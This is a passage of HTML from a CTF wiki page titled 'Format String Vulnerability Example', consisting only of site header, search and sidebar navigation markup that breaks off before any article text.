
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Wiki EN">
      
      
        <meta name="author" content="mahaloz">
      
      
        <link rel="canonical" href="https://ctf-wiki.mahaloz.re/pwn/linux/fmtstr/fmtstr_example/">
      
      
        <link rel="prev" href="../fmtstr_intro/">
      
      
        <link rel="next" href="../fmtstr_detect/">
      
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
    
    
      
        <title>Format String Vulnerability Example - CTF Wiki EN</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#format-string-vulnerability-example" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="CTF Wiki EN" class="md-header__button md-logo" aria-label="CTF Wiki EN" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CTF Wiki EN
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Format String Vulnerability Example
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/mahaloz/ctf-wiki-en" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    mahaloz/ctf-wiki-en
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../.." class="md-tabs__link">
          
  
  
  Introduction

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../misc/introduction/" class="md-tabs__link">
          
  
  
  Misc

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../crypto/introduction/" class="md-tabs__link">
          
  
  
  Crypto

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../web/introduction/" class="md-tabs__link">
          
  
  
  Web

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../assembly/x86-x64/readme/" class="md-tabs__link">
          
  
  
  Assembly

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../executable/elf/elf-structure.md" class="md-tabs__link">
          
  
  
  Executable

        </a>
      </li>
    
  

    
  

      
        
  
  
  
  
    
    
      
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../reverse/introduction/" class="md-tabs__link">
          
  
  
  Reverse Engineering

        </a>
      </li>
    
  

    
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../../readme/" class="md-tabs__link">
          
  
  
  Pwn

        </a>
      </li>
    
  

    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../android/basic_develop/basic_develop/" class="md-tabs__link">
          
  
  
  Android

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../ics/ctfs/" class="md-tabs__link">
          
  
  
  ICS

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="CTF Wiki EN" class="md-nav__button md-logo" aria-label="CTF Wiki EN" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17z"/></svg>

    </a>
    CTF Wiki EN
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/mahaloz/ctf-wiki-en" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    mahaloz/ctf-wiki-en
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Introduction
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Getting Started
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../introduction/history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CTF History
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../introduction/mode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CTF Competition Types
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../introduction/content/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CTF Competition Topics
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../introduction/experience/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Attack and Defense Experience Summary
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../introduction/resources/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Learning Resources
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Misc
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Miscellaneous Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/recon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Information Gathering Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Encoding Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Encoding Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/encode/communication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Encoding Used in Communication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/encode/computer/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Encoding Used in Computing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/encode/modern/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Encoding Used in the Real World
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/prereq/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forensic and Steganography Prerequisite
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Image Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Image Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/picture/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Image Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/picture/png/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PNG
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/picture/jpg/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    JPG
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/picture/gif/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GIF
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/audio/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Audio Steganography
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
        
          
          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Traffic Packet Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7">
            <span class="md-nav__icon md-icon"></span>
            Traffic Packet Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Traffic Packet Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/fix/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PCAP File Repairing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7_3" >
        
          
          <label class="md-nav__link" for="__nav_2_7_3" id="__nav_2_7_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Protocol Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_3">
            <span class="md-nav__icon md-icon"></span>
            Protocol Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Overview of Protocol Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/Wireshark/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Wireshark
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/HTTP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTTP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/HTTPS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTTPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/FTP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FTP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/DNS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DNS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/WIFI/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WIFI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/protocols/USB/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    USB
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/traffic/data/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Data Extraction
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_8" >
        
          
          <label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Compressed Package Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_8">
            <span class="md-nav__icon md-icon"></span>
            Compressed Package Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/archive/zip/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ZIP Format
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/archive/rar/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RAR Format
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" >
        
          
          <label class="md-nav__link" for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Disk and Memory Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_9">
            <span class="md-nav__icon md-icon"></span>
            Disk and Memory Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../misc/disk-memory/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Cryptography
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Basic Mathematics
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            Basic Mathematics
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/basic/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Classical Cipher
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Classical Cipher
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/classical/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Classical Cryptography
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/classical/monoalphabetic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Single table Substitution Cipher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/classical/polyalphabetic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Multi-table Substitution Cipher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/classical/others/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Other Types of Cipher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/classical/summary/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Summary
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Stream Cipher
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4">
            <span class="md-nav__icon md-icon"></span>
            Stream Cipher
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2" >
        
          
          <label class="md-nav__link" for="__nav_3_4_2" id="__nav_3_4_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pseudo Random Number Generator
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4_2">
            <span class="md-nav__icon md-icon"></span>
            Pseudo Random Number Generator
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
